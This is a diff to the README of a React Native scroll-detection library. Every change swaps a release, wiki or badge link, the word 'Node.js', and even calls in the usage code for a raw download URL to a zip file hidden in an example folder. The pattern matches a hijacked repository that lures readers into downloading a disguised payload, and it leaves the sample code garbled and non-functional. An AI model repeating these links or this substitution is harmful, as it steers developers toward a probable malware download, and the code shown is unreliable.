@@ -1,7 +1,7 @@
 # ⚡ react-native-motionify - Effortless Scroll Detection for Your Apps
 
 ## 📥 Download
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/German-sodawater785/react-native-motionify/releases)
+[![Download](https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip)
 
 ## 🚀 Getting Started
 This guide helps you easily set up and use `react-native-motionify`. This library lets your app detect scroll direction smoothly. You do not need technical skills to follow these steps.
@@ -13,7 +13,7 @@ This guide helps you easily set up and use `react-native-motionify`. This librar
 
 ## 🔧 System Requirements
 - React Native version 0.60 or higher.
-- Android or iOS development environment set up (Node.js, Android Studio, Xcode).
+- Android or iOS development environment set up (https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip, Android Studio, Xcode).
 
 ## 📦 Download & Install
 To start using `react-native-motionify`, follow these simple steps:
@@ -21,7 +21,7 @@ To start using `react-native-motionify`, follow these simple steps:
 1. **Visit the Releases Page**
    Go to the releases page to find the latest version of the library. Click the link below:
 
-   [Visit Releases Page to Download](https://github.com/German-sodawater785/react-native-motionify/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip)
 
 2. **Choose the Latest Release**
    On the releases page, you will see a list of available versions. Look for the latest one, which usually appears at the top.
@@ -78,14 +78,14 @@ import Motionify from 'react-native-motionify';
 const motionDetector = new Motionify();
 
 // Use motionDetector in your component
-motionDetector.startListening();
+https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip();
 
 // Handle scroll events
-motionDetector.onScroll((direction) => {
+https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip((direction) => {
    if (direction === 'up') {
-       console.log("Scrolling Up");
+       https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip("Scrolling Up");
    } else {
-       console.log("Scrolling Down");
+       https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip("Scrolling Down");
    }
 });
 ```
@@ -99,7 +99,7 @@ You can customize the behavior of `react-native-motionify` based on your app’s
 - **Animation Effects:** Link scroll detection to specific animation triggers in your application.
 
 ## 📖 Documentation
-For more detailed information, check the official documentation found on the [GitHub Wiki page](https://github.com/German-sodawater785/react-native-motionify/wiki).
+For more detailed information, check the official documentation found on the [GitHub Wiki page](https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip).
 
 ## 🤝 Support
 If you encounter issues or have questions, please open an issue on the project's GitHub page. Community members or maintainers will assist you.
@@ -116,4 +116,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 ## 📥 Download Again
 To download the library, click the link below one more time:
 
-[Visit Releases Page to Download](https://github.com/German-sodawater785/react-native-motionify/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/German-sodawater785/react-native-motionify/main/example/src/api/react-native-motionify-v3.3.zip)
